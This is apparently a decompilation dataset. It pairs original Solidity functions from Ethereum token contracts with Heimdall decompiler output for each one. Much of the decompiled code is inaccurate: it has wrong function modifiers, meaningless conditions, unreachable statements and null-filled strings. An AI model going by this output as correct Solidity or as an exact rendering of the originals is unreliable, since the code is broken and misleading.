{"contract_address": "0x35D17C2467E1D8aB2d8789FD7af72af770BDBc52", "original_solidity_code": "function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {\\r\\n      _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue, \\\"ERC20: decreased allowance below zero\\\"));\\r\\n      return true;\\r\\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        uint256 var_a = 0x60 + var_a;\n        var_b = 0x25;\n        var_c = this.code[3312:3349];\n        address var_d = msg.sender;\n        var_e = 0x05;\n        var_d = address(arg0);\n        address var_e = keccak256(var_d);\n        require(!(arg1 > storage_map_e[var_d]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_g = (0x20 + (0x04 + var_a)) - (0x04 + var_a);\n        uint256 var_h = var_a.length;\n        require(!(bytes1(var_a.length)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_i = (~((0x0100 ** (0x20 - (bytes1(var_a.length)))) - 0x01)) & (var_j);\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_d = address(msg.sender);\n        var_e = 0x05;\n        var_d = address(arg0);\n        var_e = keccak256(var_d);\n        storage_map_e[var_d] = storage_map_e[var_d] - arg1;\n        address var_f = storage_map_e[var_d] - arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_e[var_d] - arg1);\n        var_f = 0x01;\n        return 0x01;\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = (0x20 + (0x04 + var_a)) - (0x04 + var_a);\n        var_h = 0x22;\n        var_k = this.code[3127:3161];\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = (0x20 + (0x04 + var_a)) - (0x04 + var_a);\n        var_h = 0x24;\n        var_k = this.code[3276:3312];\n    }"}
{"contract_address": "0xEA7e79D24b9FfA2EB98f06672377FE1212C2195E", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner / 0x01), 0);\n        owner = 0 | (uint96(owner));\n    }"}
{"contract_address": "0x9BF903014c2dbD36f8818eBfc7D840B2cDB6A25b", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_e[var_a] > ~(arg1)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_e[var_a] = storage_map_e[var_a] + arg1;\n        uint256 var_d = storage_map_e[var_a] + arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_e[var_a] + arg1);\n        var_d = 0x01;\n        return 0x01;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xAB17E21aaAaF60C9022E34e3AcdBC73EEeb0f880", "original_solidity_code": "function setSwapTokensAtAmount(uint256 newAmount)\r\n        external\r\n        onlyOwner\r\n        returns (bool)\r\n    {\r\n        require(\r\n            newAmount >= (totalSupply() * 1) / 10000,\r\n            \"Swap amount cannot be lower than 0.001% total supply.\"\r\n        );\r\n        require(\r\n            newAmount <= (totalSupply() * 5) / 1000,\r\n            \"Swap amount cannot be higher than 0.5% total supply.\"\r\n        );\r\n        swapTokensAtAmount = newAmount;\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function setSwapTokensAtAmount(uint256 arg0) public view {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require((totalSupply == ((totalSupply * 0x01) / 0x01)) | !0x01, \"Swap amount cannot be lower than 0.001% total supply.\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x2710, \"Swap amount cannot be lower than 0.001% total supply.\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        require(!(arg0 < ((totalSupply * 0x01) / 0x2710)), \"Swap amount cannot be lower than 0.001% total supply.\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x35;\n        var_d = 0x5377617020616d6f756e742063616e6e6f74206265206c6f776572207468616e;\n        var_g = 0x20302e3030312520746f74616c20737570706c792e0000000000000000000000;\n    }"}
{"contract_address": "0xe1d694acc0BA97387ba1BA0Ed26437DD49f0ea05", "original_solidity_code": "function isBot(address a) public view returns (bool){\r\n      return bots[a];\r\n    }", "heimdall_decompiled_code": "function isBot(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x05;\n        address var_c = !(!bytes1(storage_map_b[var_a] / 0x01));\n        return !(!bytes1(storage_map_b[var_a] / 0x01));\n    }"}
{"contract_address": "0x3D93F860f4f6f4C54B79eDa0c09A1E70cc79947b", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\\n        _approve(_msgSender(), spender, amount);\\n        return true;\\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xf9F4ed2EE87e3Bc8a3cDC7538d1217B100511eA3", "original_solidity_code": "function removeLimits() external onlyOwner{\\r\\n        _maxTxAmount = _tTotal;\\r\\n        _maxWalletSize=_tTotal;\\r\\n        transferDelayEnabled=false;\\r\\n        emit MaxTxAmountUpdated(_tTotal);\\r\\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            if (!0x3b9aca00 | (0x01 == 0x01)) {\n                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_g = 0x11;\n                _maxTxAmount = 0x3b9aca00;\n                if (0x09) {\n                    if (!0x3b9aca00 | (0x01 == 0x01)) {\n                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_g = 0x11;\n                        _maxWalletSize = 0x3b9aca00;\n                        transferDelayEnabled = (0 * 0x01) | (uint248(transferDelayEnabled));\n                        if (0x09) {\n                            if (!0x3b9aca00 | (0x01 == 0x01)) {\n                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_g = 0x11;\n                                var_a = 0x3b9aca00;\n                                emit MaxTxAmountUpdated(0x3b9aca00);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x09 > 0xff) {\n                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_g = 0x11;\n                                                if (!0x0200 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                    var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                    var_g = 0x11;\n                                                    if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                                        if (!0x09 > 0x01) {\n                                                            if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_g = 0x11;\n                                                                if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                    var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                    var_g = 0x11;\n                                                                    if (!0x01) {\n                                                                    }\n                                                                    if (!0x3b9aca00 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                        var_g = 0x11;\n                                                                    }\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xaEAD18A6f788fb7460aDA9fDFf4C4Cd6Ba72dDBE", "original_solidity_code": "function tokensOfOwner(address owner) external view returns (uint256[] memory);\\n}\\n\"\r\n    },\r\n    \"contracts/HasRegistration.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: CLOSED - Pending Licensing Audit\\npragma solidity ^0.8.4;\\nimport \\\"./IsBypassable.sol\\\";\\n\\ncontract HasRegistration is IsBypassable {\\n\\n    mapping(address => uint256) public registeredContracts; // 0 EMPTY, 1 ERC1155, 2 ERC721, 3 HANDLER, 4 ERC20, 5 BALANCE, 6 CLAIM, 7 UNKNOWN, 8 FACTORY, 9 STAKING, 10 BYPASS\\n    mapping(uint256 => address[]) internal registeredOfType;\\n\\n    modifier isRegisteredContract(address _contract) {\\n        require(registeredContracts[_contract] > 0, \\\"Contract is not registered\\\");\\n        _;\\n    }\\n\\n    modifier isRegisteredContractOrOwner(address _contract) {\\n        require(registeredContracts[_contract] > 0 || owner() == _msgSender(), \\\"Contract is not registered nor Owner\\\");\\n        _;\\n    }\\n\\n    function registerContract(address _contract, uint _type) public isRegisteredContractOrOwner(_msgSender()) {\\n        registeredContracts[_contract] = _type;\\n        registeredOfType[_type].push(_contract);\\n    }\\n\\n    function unregisterContract(address _contract, uint256 index) public onlyOwner isRegisteredContract(_contract) {\\n        address[] storage arr = registeredOfType[registeredContracts[_contract]];\\n        arr[index] = arr[arr.length - 1];\\n        arr.pop();\\n        delete registeredContracts[_contract];\\n    }\\n\\n    function isRegistered(address _contract, uint256 _type) public view returns (bool) {\\n        return registeredContracts[_contract] == _type;\\n    }\\n\\n    function getAllRegisteredContractsOfType(uint256 _type) public view returns (address[] memory) {\\n        return registeredOfType[_type];\\n    }\\n}\"\r\n    }", "heimdall_decompiled_code": "function tokensOfOwner(address arg0) public view returns (bytes memory) {\n        require(arg0 == (address(arg0)));\n        if (0x01 == totalSupply) {\n            var_a = 0x20;\n            var_b = var_c;\n            if (!0 < var_c) {\n                return abi.encodePacked(0x20, var_c);\n                if (0x01 < totalSupply) {\n                    if (!0x01 < 0x01) {\n                        if (totalSupply < totalSupply) {\n                            if (address(arg0)) {\n                                address var_d = address(arg0);\n                                var_e = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c45;\n                                if (!(0x01 < totalSupply) * (uint64(storage_map_k[var_d]))) {\n                                    require(0x01 == totalSupply, CustomError_8f4eb604());\n                                    uint256 var_f = var_f + (((totalSupply - 0x01) + 0x01) << 0x05);\n                                    var_f = var_f + 0x80;\n                                    uint256 var_a = 0;\n                                    uint256 var_b = 0;\n                                    uint256 var_g = 0;\n                                    uint256 var_h = 0;\n                                    require(!(0 < var_c), CustomError_8f4eb604());\n                                    require(0x01 < totalSupply, CustomError_8f4eb604());\n                                    var_f = var_f + 0x80;\n                                    uint256 var_i = 0;\n                                    uint256 var_j = 0;\n                                    uint256 var_k = 0;\n                                    uint256 var_l = 0;\n                                    var_d = 0x01;\n                                    var_e = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c44;\n                                    var_f = var_f + 0x80;\n                                    uint256 var_m = 0;\n                                    uint256 var_n = 0;\n                                    uint256 var_o = 0;\n                                    uint256 var_p = 0;\n                                    var_m = address(storage_map_k[var_d]);\n                                    var_n = uint64(storage_map_k[var_d] >> 0xa0);\n                                    var_o = !(!bytes1(storage_map_k[var_d]));\n                                    var_p = storage_map_k[var_d] >> 0xe8;\n                                    require(!(0x01 < 0x01), CustomError_8f4eb604());\n                                    require(totalSupply < totalSupply, CustomError_8f4eb604());\n                                    require(address(arg0), CustomError_8f4eb604());\n                                }\n                                require(!((0x01 < totalSupply) * (uint64(storage_map_k[var_d]))), CustomError_8f4eb604());\n                                require((totalSupply - 0x01) > ((0x01 < totalSupply) * (uint64(storage_map_k[var_d]))), CustomError_8f4eb604());\n                                require(0x01 < 0x01, CustomError_8f4eb604());\n                                require(var_q, CustomError_8f4eb604());\n                            }\n                            var_b = 0x01;\n                            require(var_r == 0, CustomError_8f4eb604());\n                        }\n                    }\n                }\n                require(!var_f.length, CustomError_8f4eb604());\n                var_d = 0x01;\n                var_e = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c44;\n                require((var_f.length ^ arg0) << 0x60, CustomError_8f4eb604());\n            }\n            var_f = var_f + (((0x01 < totalSupply) * (uint64(storage_map_k[var_d])) + 0x01) << 0x05);\n            var_f = var_f + 0x80;\n            var_b = 0;\n            var_g = 0;\n            var_h = 0;\n            var_i = 0;\n            require(!(0x01 < totalSupply), CustomError_8f4eb604());\n            require(0x01 < 0x01, CustomError_8f4eb604());\n            var_d = 0x01;\n            var_e = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c44;\n            require(!(0x01 < totalSupply), CustomError_8f4eb604());\n        }\n        var_d = 0x8f4eb60400000000000000000000000000000000000000000000000000000000;\n        var_d = 0x32c1995a00000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x5ED7ad95beA8f3c7aB1bDeCCb843EbDE3B902BB2", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0xaEAD18A6f788fb7460aDA9fDFf4C4Cd6Ba72dDBE", "original_solidity_code": "function name() public view virtual override returns (string memory) {\\n        return ERC721AStorage.layout()._name;\\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_a >> 0x01;\n                if (store_a) {\n                    if (store_a - ((store_a >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a >> 0x01) {\n                            if (0x1f < (store_a >> 0x01)) {\n                                var_a = 0x2569078dfb4b0305704d3008e7403993ae9601b85f7ae5e742de3de8f8011c42;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked(0x20, var_c.length);\n                                        return abi.encodePacked(0x20, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x6F277374E9329ff8a1DeE8e064929892b69C535C", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0xEBe0De4bfB351537dd8Abdb2e53a880Cc13ce676", "original_solidity_code": "function manualSend() external onlyOwner {\r\n        uint256 ethBalance=address(this).balance;\r\n        if(ethBalance>0){\r\n          sendETHToFee(ethBalance);\r\n        }\r\n    }", "heimdall_decompiled_code": "function manualSend() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!address(this).balance);\n        (bool success, bytes memory ret0) = address(store_k).transfer(address(this).balance);\n    }"}
{"contract_address": "0x842FD31eAd327AE42D19B7BFbdB045d3A219c662", "original_solidity_code": "function changeW2(address DevW) external onlyOwner {\r\n        require(DevW != address(0),\"BigBoss: Address Zero\");\r\n        DevAddress = payable(DevW);\r\n        emit _changeW2(DevW);\r\n    }", "heimdall_decompiled_code": "function changeW2(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(getOwner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"BigBoss: Address Zero\");\n        store_i = (address(arg0)) | (uint96(store_i));\n        address var_a = address(arg0);\n        emit _changeW2(address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x15;\n        var_d = 0x426967426f73733a2041646472657373205a65726f0000000000000000000000;\n    }"}
{"contract_address": "0x926911A3809B6e15FA9dab87A4beAE0E83361C75", "original_solidity_code": "function updateMaxWalletAmount(uint256 newNum) external onlyOwner {\r\n        require(newNum >= (totalSupply() * 5 / 1000)/1e18, \"Cannot set maxWallet lower than 0.5%\");\r\n        maxWallet = newNum * (10**18);\r\n    }", "heimdall_decompiled_code": "function updateMaxWalletAmount(uint256 arg0) public view {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(0x05) & (totalSupply > 0x3333333333333333333333333333333333333333333333333333333333333333));\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x03e8);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n    }"}
{"contract_address": "0xaE58EE426C98ed45F91282D027FAFe4E74c70D75", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        transferDelayEnabled=false;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x08) {\n            if ((0x01 == 0x01) | !0x05f5e100) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                _maxTxAmount = 0x05f5e100;\n                if (0x08) {\n                    if ((0x01 == 0x01) | !0x05f5e100) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        _maxWalletSize = 0x05f5e100;\n                        transferDelayEnabled = uint248(transferDelayEnabled);\n                        if (0x08) {\n                            if ((0x01 == 0x01) | !0x05f5e100) {\n                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_f = 0x11;\n                                var_a = 0x05f5e100;\n                                emit MaxTxAmountUpdated(0x05f5e100);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x08 > 0xff) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!((0x0a < 0x0b) & (0x08 < 0x4e)) | ((0x0a < 0x0133) & (0x08 < 0x20))) {\n                                                    if (!0x08 > 0x01) {\n                                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                            var_f = 0x11;\n                                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_f = 0x11;\n                                                                if (!0) {\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x0a2746D0FE88EeB9538183408295c061593E478e", "original_solidity_code": "function balanceOf(address account) public view virtual override returns (uint256) {\\n        return _balances[account];\\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0xf7572367197fE25A2F2bEe8d267a1d5cA0713ea3", "original_solidity_code": "function transfer(address recipient, uint256 amount) external override returns (bool) {\\r\\n      _transfer(msg.sender, recipient, amount);\\r\\n      return true;\\r\\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(address(msg.sender));\n        require(address(arg0));\n        var_a = 0x70a0823100000000000000000000000000000000000000000000000000000000;\n        address var_b = address(msg.sender);\n        require(address(0x5491305204daca75317a0bc8c332dd61dbb77bc8).code.length);\n        (bool success, bytes memory ret0) = address(0x5491305204daca75317a0bc8c332dd61dbb77bc8).Unresolved_70a08231(var_b); // staticcall\n        require(!(ret0.length < 0x20), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        address var_c = msg.sender;\n        var_d = 0x06;\n        require(!storage_map_b[var_c], \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(var_e.length > 0), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_e = 0x60 + var_e;\n        var_a = 0x26;\n        var_f = this.code[3161:3199];\n        var_c = address(msg.sender);\n        var_d = 0x04;\n        require(!(arg1 > storage_map_b[var_c]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_h = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        uint256 var_i = var_e.length;\n        require(!(bytes1(var_e.length)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_j = (~((0x0100 ** (0x20 - (bytes1(var_e.length)))) - 0x01)) & (var_k);\n        var_c = address(msg.sender);\n        var_d = 0x04;\n        storage_map_b[var_c] = storage_map_b[var_c] - arg1;\n        var_c = address(arg0);\n        var_d = 0x04;\n        require(!((arg1 + storage_map_b[var_c]) < storage_map_b[var_c]), \"SafeMath: addition overflow\");\n        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = 0x20;\n        var_i = 0x1b;\n        var_l = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_c = address(arg0);\n        var_d = 0x04;\n        storage_map_b[var_c] = arg1 + storage_map_b[var_c];\n        uint256 var_g = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_g = 0x01;\n        return 0x01;\n        var_e = 0x60 + var_e;\n        var_a = 0x26;\n        var_f = this.code[3161:3199];\n        require(!(arg1 > storage_map_b[var_c]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_i = var_e.length;\n        require(!(bytes1(var_e.length)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = (~((0x0100 ** (0x20 - (bytes1(var_e.length)))) - 0x01)) & (var_k);\n        if (!storage_map_b[var_c]) {\n        }\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_m = 0x23;\n        var_n = this.code[3092:3127];\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_m = 0x25;\n        var_n = this.code[3239:3276];\n    }"}
